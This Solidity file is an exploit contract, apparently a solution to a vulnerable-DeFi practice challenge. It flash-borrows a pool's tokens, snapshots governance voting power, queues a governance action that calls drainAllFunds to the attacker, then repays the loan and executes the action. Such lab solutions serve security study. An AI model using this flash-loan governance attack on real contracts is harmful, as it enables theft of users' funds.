// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "hardhat/console.sol";


interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;
    function drainAllFunds(address receiver) external;
}

interface ISimpleGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
}

interface IDamnValuableTokenSnapshot is IERC20 {
    function snapshot() external returns (uint256);
    function getBalanceAtLastSnapshot(address account) external view returns (uint256);
}

contract AttackSelfiePool {
    using Address for address;

    ISelfiePool pool;
    IDamnValuableTokenSnapshot token;
    ISimpleGovernance governance;
    address attacker;
    uint256 actionId;

    constructor(address _pool, address _token, address _gov, address _attacker) {
        pool = ISelfiePool(_pool);
        token = IDamnValuableTokenSnapshot(_token);
        governance = ISimpleGovernance(_gov);
        attacker = _attacker;
    }

    function getActionId() public view returns (uint256) {
        return actionId;
    }

    function attack() public {
        // uint256 amount = token.balanceOf(address(pool));
        // pool.flashLoan(amount);

        uint256 flashLoanBalance = token.balanceOf(address(pool));
        attacker = msg.sender;

        // get flash loan
        pool.flashLoan(flashLoanBalance);


    }


    function receiveTokens(address _token, uint256 _borrowAmount) external {
        address receiver = address(pool);
        uint256 weiAmount = 0;
        bytes memory data = abi.encodeWithSignature(
                "drainAllFunds(address)",
                attacker
            );
        token.snapshot();
        token.approve(address(pool), _borrowAmount);
        actionId = governance.queueAction(receiver, data, weiAmount);
        // flash loan pay-back
        token.transfer(address(pool), _borrowAmount);
    }

    function attack2() public {
        governance.executeAction(actionId);
    }
}